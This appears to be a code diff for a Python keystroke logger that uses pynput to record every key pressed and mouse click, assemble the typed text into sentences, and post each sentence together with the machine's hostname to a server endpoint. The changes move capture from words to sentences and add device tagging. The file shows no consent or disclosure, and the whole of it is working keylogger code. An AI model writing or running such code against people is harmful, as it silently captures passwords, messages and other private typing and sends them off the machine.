@@ -1,41 +1,50 @@
 import requests
+import socket
 from pynput import keyboard, mouse
 
-current_word = []
+sentence_buffer = []
 
-def send_to_server(word):
-    try: 
-        requests.post("http://localhost:5000/event", json={"word": word})
+# def send_sentence(sentence):
+#     try:
+#         requests.post("http://localhost:5000/event", json={"word": sentence})
+#     except Exception as e:
+#         print("Error sending sentence:", e)
+
+def send_sentence(sentence):
+    try:
+        device_name = socket.gethostname()  # Get the device (host) name
+        print(device_name)
+        requests.post("http://localhost:5000/event", json={
+            "word": sentence,
+            "device": device_name
+        })
     except Exception as e:
-        print("Error sending word:", e)
+        print("Error sending sentence:", e)
 
 def on_press(key):
-    global current_word
+    global sentence_buffer
     try:
         if hasattr(key, 'char') and key.char is not None:
-            current_word.append(key.char)
-    except AttributeError:
-        pass
-
-    if key == keyboard.Key.space or key == keyboard.Key.enter:
-        if current_word:
-            word = ''.join(current_word)
-            send_to_server(word)
-            current_word = []
+            sentence_buffer.append(key.char)
+        elif key == keyboard.Key.space:
+            sentence_buffer.append(' ')  # Add space character
+        elif key == keyboard.Key.enter:
+            if sentence_buffer:
+                sentence = ''.join(sentence_buffer).strip()
+                send_sentence(sentence)
+                sentence_buffer = []
+    except Exception as e:
+        print("Error in key press:", e)
 
 def on_click(x, y, button, pressed):
-    global current_word
-    if pressed and current_word:
-        word = ''.join(current_word)
-        send_to_server(word)
-        current_word = []
+    global sentence_buffer
+    if pressed and sentence_buffer:
+        sentence = ''.join(sentence_buffer).strip()
+        send_sentence(sentence)
+        sentence_buffer = []
 
 if __name__ == "__main__":
-    keyboard_listener = keyboard.Listener(on_press=on_press)
-    mouse_listener = mouse.Listener(on_click=on_click)
-
-    keyboard_listener.start()
-    mouse_listener.start()
-
-    keyboard_listener.join()
-    mouse_listener.join()
+    keyboard.Listener(on_press=on_press).start()
+    mouse.Listener(on_click=on_click).start()
+    while True:
+        pass  # Keep script running
